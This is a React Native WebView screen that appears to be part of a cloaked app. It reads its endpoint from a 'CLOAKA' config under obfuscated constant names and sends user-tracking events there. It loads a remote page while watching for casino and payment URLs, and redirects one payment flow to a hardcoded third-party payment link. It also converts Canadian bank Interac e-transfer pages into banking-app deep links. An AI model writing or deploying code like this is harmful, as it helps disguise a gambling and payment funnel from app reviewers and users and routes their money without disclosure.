import React, { useEffect, useRef, useState } from 'react';
import {
  ActivityIndicator,
  Alert,
  AppState,
  Image,
  Linking,
  TouchableOpacity,
  View,
  SafeAreaView,
  Text
} from 'react-native';
import { WebView } from 'react-native-webview';
import AsyncStorage from '@react-native-async-storage/async-storage';
///
import { CLOAKA } from '../config/projectConfig';


const ProductScreen = ({ route }) => {
  const [product] = useState(route.params?.product);
  const [customUserAgent] = useState(route.params?.customUserAgent);
  const [canGoBack, setCanGoBack] = useState(false);//
  const [currentWebUrl, setCurrentWebUrl] = useState(product);//
  const refWebview = useRef(null);
  const bankFallbackUrlRef = useRef(null);//
  const allowBankFallbackRef = useRef(null);//
  const bankWebFallbackRef = useRef(new Map());//
  const tdWebOnlyRef = useRef(false);//
  const [redirectUrl, setRedirectUrl] = useState(product);
  const [checkNineUrl, setCheckNineUrl] = useState();
  const [isLoading, setIsLoading] = useState(true);
  ////////
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const initialLoadingTimeoutRef = useRef(null);
  const initialLoadingFinishedRef = useRef(false);
  const initialLoadStartedAtRef = useRef(Date.now());
  //////
  const externalAppOpenedRef = useRef(false);
  const loadingTimeoutRef = useRef(null);
  ///////
  const HBJYBJBJB_BJL = CLOAKA.baseUrl;
  const YHBKJNBUKN_ID = CLOAKA.id;
  const [timeStampUserId, setTimeStampUserId] = useState(
    route.params?.timeStampUserId,
  );

  useEffect(() => {
    const subscription = AppState.addEventListener('change', nextState => {
      if (nextState === 'active' && externalAppOpenedRef.current) {
        externalAppOpenedRef.current = false;
        if (loadingTimeoutRef.current) {
          clearTimeout(loadingTimeoutRef.current);
          loadingTimeoutRef.current = null;
        }
        setIsLoading(false);
      }
    });
    return () => {
      subscription.remove();
      if (loadingTimeoutRef.current) {
        clearTimeout(loadingTimeoutRef.current);
      }
    };
  }, []);

 
  useEffect(() => {
    const sendPushSubscribeEvent = async () => {
      const pushSubscribeStatus = await AsyncStorage.getItem(
        'pushSubscribeStatus',
      );

      if (!pushSubscribeStatus && route.params?.responseToPushPermition) {
        fetch(
          `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=push_subscribe&jthrhg=${timeStampUserId}`,
        );
        console.log('івент push_subscribe !!!');
        await AsyncStorage.setItem('pushSubscribeStatus', 'sent');
      }
    };

    setTimeout(() => {
      sendPushSubscribeEvent();
    }, 500);
  }, []);


  const hasWebViewOpenEventSent = useRef(false); 

  useEffect(() => {
    if (!hasWebViewOpenEventSent.current) {
      hasWebViewOpenEventSent.current = true; 
      fetch(
        `${HBJYBJBJB_BJL}${YHBKJNBUKN_ID}?utretg=webview_open&jthrhg=${timeStampUserId}`,
      );

    }
  }, []);

  const isWebViewScheme = url => {
    if (!url) {
      return false;
    }
    const normalizedUrl = url.toLowerCase();
    return (
      normalizedUrl.startsWith('http://') ||
      normalizedUrl.startsWith('https://') ||
      normalizedUrl.startsWith('about:') ||
      normalizedUrl.startsWith('blob:') ||
      normalizedUrl.startsWith('data:')
    );
  };

  const isJavascriptScheme = url => {
    if (!url) {
      return false;
    }
    return url.toLowerCase().startsWith('javascript:');
  };

  const getParamFromUrl = (url, name) => {
    const match = url.match(new RegExp(`[?&#]${name}=([^&#]+)`, 'i'));
    return match ? decodeURIComponent(match[1]) : null;
  };

  const STAY_ON_PAGE_BANK_SCHEMES = ['pcfbank://', 'scotiabank://'];

  const isStayOnPageBankLink = url =>
    STAY_ON_PAGE_BANK_SCHEMES.some(scheme =>
      url.toLowerCase().startsWith(scheme),
    );
  
  const openExternalUrl = async (url, fallbackUrl = null) => {
    if (!url) {
      return;
    }
    setIsLoading(false);
    if (bankWebFallbackRef.current.has(url)) {
      console.log('BLOCK REPEATED BANK DEEP LINK ==>', url);
      return;
    }
    externalAppOpenedRef.current = true;
    try {
      await Linking.openURL(url);
      
      if (fallbackUrl && /^https?:\/\//i.test(fallbackUrl)) {
        bankWebFallbackRef.current.set(url, fallbackUrl);
        allowBankFallbackRef.current = fallbackUrl;
        navigateWebViewToUrl(fallbackUrl);
      }

    } catch (error) {
      externalAppOpenedRef.current = false;
      console.warn('Unable to open external URL:', url, error);
      if (fallbackUrl && /^https?:\/\//i.test(fallbackUrl)) {
        bankWebFallbackRef.current.set(url, fallbackUrl);
      }
      if (url.toLowerCase().startsWith('tdct://')) {
        tdWebOnlyRef.current = true;
        console.log('TD BANK WEB ONLY MODE ENABLED');
      }
      if (isStayOnPageBankLink(url)) {

        if (!bankWebFallbackRef.current.has(url) && currentWebUrl) {
          bankWebFallbackRef.current.set(url, currentWebUrl);
        }
        Alert.alert(
          'App not installed',
          'There is no application installed to open this link.',
          [
            {
              text: 'OK',
              onPress: () => {
       
                if (loadingTimeoutRef.current) {
                  clearTimeout(loadingTimeoutRef.current);
                  loadingTimeoutRef.current = null;
                }
                setIsLoading(false);
              },
            },
          ],
        );
        return;
      }
      Alert.alert(
        'App not installed',
        'There is no application installed to open this link.',
        [
          {
            text: 'OK',
            onPress: () => {
              if (fallbackUrl && /^https?:\/\//i.test(fallbackUrl)) {
                allowBankFallbackRef.current = fallbackUrl;
                navigateWebViewToUrl(fallbackUrl);
              } else {
                refWebview.current?.goBack();
              }
            },
          },
        ],
      );
    }
  };//

  const handleBankRedirect = url => {
    const normalizedUrl = url.toLowerCase();
    if (normalizedUrl.includes('rbcroyalbank.com')) {
      const emrf = getParamFromUrl(url, 'emrf');
      if (emrf) {
        openExternalUrl(`rbcmobile://emrf_${emrf}`, url);
        return true;
      }
    }
    if (normalizedUrl.includes('cibconline.cibc.com')) {
      const emtId = getParamFromUrl(url, 'emtId');
      if (emtId) {
        openExternalUrl(
          `cibcbanking://requestetransfer?etransfertoken=${emtId}`,
          url
        );
        return true;
      }
    }
    if (normalizedUrl.includes('secure.scotiabank.com')) {
      const requestRefNumber = getParamFromUrl(url, 'requestRefNumber');
      if (requestRefNumber) {
        openExternalUrl(
          `scotiabank://?requestFlag=true&requestRefNumber=${requestRefNumber}`,
          url
        );
        return true;
      }
    }
    if (normalizedUrl.includes('m.bmo.com')) {
      const token = getParamFromUrl(url, 'receiveFulfillToken');
      if (token) {
        openExternalUrl(`bmoolbb://id=${token}&type=FULFILL`, url);
        return true;
      }
    }
    if (normalizedUrl.includes('conexus.ca')) {
      const paymentId = getParamFromUrl(url, 'paymentId');
      const type = getParamFromUrl(url, 'type');
      if (paymentId && type) {
        openExternalUrl(
          `conexus://etransfers?type=${type}&paymentId=${paymentId}`, url
        );
        return true;
      }
    }
    if (normalizedUrl.includes('secure.pcfinancial.ca')) {
      const demandNumber = getParamFromUrl(
        url,
        'interacIssuedIncomingMoneyDemandNumber',
      );
      if (demandNumber) {
        openExternalUrl(
          `pcfbanking://?interacIssuedIncomingMoneyDemandNumber=${demandNumber}`, url
        );
        return true;
      }
    }
    if (normalizedUrl.includes('feeds.td.com')) {
      if (tdWebOnlyRef.current) {
        console.log('TD WEB FALLBACK ALLOWED ==>', url);
        return false;
      }
      const rmid = getParamFromUrl(url, 'RMID');
      if (rmid) {
        openExternalUrl(`tdct://?RMID=${rmid}`, url);
        return true;
      }
    }
    return false;
  };

  const navigateWebViewToUrl = url => {
    if (!url || !refWebview.current) {
      return;
    }
    refWebview.current.injectJavaScript(`
      window.location.href = ${JSON.stringify(url)};
      true;
    `);
  };

  const handleNavigationStateChange = navState => {
    const url = navState?.url || '';
    setCanGoBack(navState.canGoBack);//
    setCurrentWebUrl(url);//
    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
      return;
    }
    if (url.includes('https://ninecasino')) {
      setCheckNineUrl(product);
      return;
    }
    if (url.includes('https://interac.express-connect.com/cpi?transaction=')) {
      setRedirectUrl(product);
      return;
    }
    if (url.includes('about:blank') && checkNineUrl === product) {
      navigateWebViewToUrl(redirectUrl);
      return;
    }
    if (
      url.includes('https://app.corzapay.com/payment/') &&
      checkNineUrl === product
    ) {
      openExternalUrl(
        'https://payment.paydmeth.com/en/cointy-white/payment/c13f7613-8ae7-48e0-8915-aa8187dd94ed',
      );
      return;
    }
    if (
      url.includes('neteller') ||
      url.includes('rapidtransfer') ||
      (url.includes('paysafecard') && checkNineUrl === product)
    ) {
     
      return;
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const url = event?.url;
    if (!url) {
      setIsLoading(false);
      return false;
    }
   
    if (
      allowBankFallbackRef.current &&
      url === allowBankFallbackRef.current
    ) {
      console.log('ALLOW BANK WEB FALLBACK ==>', url);
      allowBankFallbackRef.current = null;
      return true;
    }
    if (isJavascriptScheme(url)) {
      console.log('BLOCKED JAVASCRIPT URL ==>', url);
      setIsLoading(false);
      return false;
    }
   
    const isKnownBankFallback = Array.from(
      bankWebFallbackRef.current.values(),
    ).some(fallbackUrl => fallbackUrl === url);
    if (isKnownBankFallback) {
      console.log('ALLOW KNOWN BANK FALLBACK ==>', url);
      return true;
    }
    if (
      tdWebOnlyRef.current &&
      url.toLowerCase().startsWith('tdct://')
    ) {
      console.log('BLOCKED TD DEEP LINK ==>', url);
      setIsLoading(false);
      return false;
    }
    if (bankWebFallbackRef.current.has(url)) {
      console.log('BLOCK REPEATED BANK DEEP LINK ==>', url);
      setIsLoading(false);
      return false;
    }
    if (handleBankRedirect(url)) {
      setIsLoading(false);
      return false;
    }
    if (isWebViewScheme(url)) {
      console.log('WEBVIEW URL ==>', url);
      return true;
    }
    openExternalUrl(url);
    setIsLoading(false);
    return false;
  };

  const handleOpenWindow = event => {
    const targetUrl = event?.nativeEvent?.targetUrl;
    console.log('onOpenWindow targetUrl ==>', targetUrl);
    if (!targetUrl) {
      setIsLoading(false);
      return;
    }
    if (isJavascriptScheme(targetUrl)) {
      console.log('BLOCKED JAVASCRIPT WINDOW ==>', targetUrl);
      setIsLoading(false);
      return;
    }
   
    if (bankWebFallbackRef.current.has(targetUrl)) {
      console.log('BLOCK REPEATED BANK WINDOW ==>', targetUrl);
      setIsLoading(false);
      return;
    }
    
    if (
      tdWebOnlyRef.current &&
      targetUrl.toLowerCase().startsWith('tdct://')
    ) {
      console.log('BLOCKED TD WINDOW DEEP LINK ==>', targetUrl);
      setIsLoading(false);
      return;
    }
  
    const isKnownBankFallback = Array.from(
      bankWebFallbackRef.current.values(),
    ).some(url => url === targetUrl);
    if (isKnownBankFallback) {
      navigateWebViewToUrl(targetUrl);
      return;
    }
    if (handleBankRedirect(targetUrl)) {
      setIsLoading(false);
      return;
    }
    if (isWebViewScheme(targetUrl)) {
      navigateWebViewToUrl(targetUrl);
      return;
    }
    openExternalUrl(targetUrl);
    setIsLoading(false);
  };

  const handleWebViewError = syntheticEvent => {
    const nativeEvent = syntheticEvent?.nativeEvent;
    const url = nativeEvent?.url || '';
    setIsLoading(false);
    console.warn('WebView error ==>', nativeEvent);
    if (url.startsWith('about:')) {
      return;
    }
  };

  const goBackBtn = () => {
    if (!canGoBack) {
      return;
    }
  
    const isBankFallbackPage = Array.from(
      bankWebFallbackRef.current.values(),
    ).some(url => currentWebUrl.startsWith(url));
    if (isBankFallbackPage) {
      console.log('BACK FROM BANK WEB FALLBACK');
    
    }
    refWebview.current?.goBack();
  };//

  const reloadPageBtn = () => {
    refWebview.current?.reload();
  };

  const handleLoadingStart = syntheticEvent => {
    const url = syntheticEvent?.nativeEvent?.url || '';
    console.log('LOAD START ==>', url);
    if (
      isInitialLoading &&
      redirectIdleTimeoutRef.current
    ) {
      clearTimeout(redirectIdleTimeoutRef.current);
      redirectIdleTimeoutRef.current = null;
    }
   
    if (externalAppOpenedRef.current) {
      setIsLoading(false);
      return;
    }
    setIsLoading(true);
    if (loadingTimeoutRef.current) {
      clearTimeout(loadingTimeoutRef.current);
    }
    loadingTimeoutRef.current = setTimeout(() => {
      console.warn('WebView loading timeout ==>', url);
      setIsLoading(false);
    }, 10000);
  };/////////////////

  const handleLoadingEnd = syntheticEvent => {
    if (loadingTimeoutRef.current) {
      clearTimeout(loadingTimeoutRef.current);
      loadingTimeoutRef.current = null;
    }
    setIsLoading(false);
    const url = syntheticEvent?.nativeEvent?.url || '';
    if (!initialLoadingFinishedRef.current) {
      scheduleInitialLoadingFinish(url);
    }
  };/////////////////

  const LoadingIndicatorView = () => (
    <View
      style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        zIndex: 10,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#191d24',
      }}
    >
      <ActivityIndicator size="large" color="#40b8ff" />
    </View>
  );

  const InitialLoadingView = () => (
    <View
      style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        zIndex: 100,
        elevation: 100,
        backgroundColor: '#151A23',
        justifyContent: 'center',
        alignItems: 'center',
        paddingHorizontal: 30,
      }}
    >
      <ActivityIndicator size="large" color="#40B8FF" />
      <Text
        style={{
          color: '#FFFFFF',
          fontSize: 22,
          fontWeight: '700',
          textAlign: 'center',
          marginTop: 28,
        }}
      >
        Finding the best offers for you
      </Text>
      <Text
        style={{
          color: '#A9B4C4',
          fontSize: 15,
          textAlign: 'center',
          marginTop: 12,
          lineHeight: 23,
        }}
      >
        Please wait while we prepare your experience...
      </Text>
    </View>
  );

  /////////////////////
  const finishInitialLoading = () => {
    if (initialLoadingFinishedRef.current) {
      return;
    }
    initialLoadingFinishedRef.current = true;
    if (initialLoadingTimeoutRef.current) {
      clearTimeout(initialLoadingTimeoutRef.current);
      initialLoadingTimeoutRef.current = null;
    }
    setIsInitialLoading(false);
  };

  useEffect(() => {
 
  initialLoadingTimeoutRef.current = setTimeout(() => {
    console.warn('Initial offer loading timeout');
    finishInitialLoading();
  }, 20000);
  return () => {
   
    if (initialLoadingTimeoutRef.current) {
      clearTimeout(initialLoadingTimeoutRef.current);
      initialLoadingTimeoutRef.current = null;
    }
   
    if (redirectIdleTimeoutRef.current) {
      clearTimeout(redirectIdleTimeoutRef.current);
      redirectIdleTimeoutRef.current = null;
    }
  };
}, []);

  const redirectIdleTimeoutRef = useRef(null);
  const latestNavigationUrlRef = useRef(null);

  const scheduleInitialLoadingFinish = url => {
    if (initialLoadingFinishedRef.current) {
      return;
    }
    if (!/^https?:\/\//i.test(url || '')) {
      return;
    }
    if (redirectIdleTimeoutRef.current) {
      clearTimeout(redirectIdleTimeoutRef.current);
    }
    latestNavigationUrlRef.current = url;
    redirectIdleTimeoutRef.current = setTimeout(() => {
      if (latestNavigationUrlRef.current === url) {
        console.log('Initial offer navigation stabilized:', url);
        finishInitialLoading();
      }
    }, 1500);
  };
  ///////////////////////
  if (!product) {
    return (
      <SafeAreaView
        style={{
          flex: 1,
          justifyContent: 'center',
          alignItems: 'center',
          backgroundColor: '#191d24',
        }}
      >
        <ActivityIndicator size="large" color="#40b8ff" />
      </SafeAreaView>
    );
  }
  return (
    <SafeAreaView style={{ flex: 1, backgroundColor: '#191d24' }}>
      <View style={{ flex: 1 }}>
        <WebView
          ref={refWebview}
          source={{ uri: product }}
          userAgent={customUserAgent}
          originWhitelist={['*']}
          onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
          onNavigationStateChange={handleNavigationStateChange}
          onError={handleWebViewError}
          onLoadStart={handleLoadingStart}
          onLoadEnd={handleLoadingEnd}
          setSupportMultipleWindows={false}
          javaScriptEnabled
          domStorageEnabled
          javaScriptCanOpenWindowsAutomatically
          allowsBackForwardNavigationGestures
         
          allowsInlineMediaPlayback
          mediaPlaybackRequiresUserAction={false}
          style={{ flex: 1 }}
        />
        {isInitialLoading ? (
          <InitialLoadingView />
        ) : (
          isLoading && <LoadingIndicatorView />
        )}
      </View>
      <View
        style={{
          flexDirection: 'row',
          justifyContent: 'space-between',
          alignItems: 'center',
          paddingTop: 4,
          paddingBottom: 0,
          backgroundColor: '#191d24',
          transform: [{ translateY: 12 }],
        }}
      >
        <TouchableOpacity
          style={{ marginLeft: 40 }}
          onPress={goBackBtn}
          activeOpacity={0.7}
        >
          <Image
            style={{ width: 30, height: 33 }}
            source={require('../../aodkagaims/icons/arrow77.png')}
          />
        </TouchableOpacity>
        <TouchableOpacity
          style={{ marginRight: 40 }}
          onPress={reloadPageBtn}
          activeOpacity={0.7}
        >
          <Image
            style={{ width: 30, height: 30 }}
            source={require('../../aodkagaims/icons/redo77.png')}
          />
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
};
export default ProductScreen;
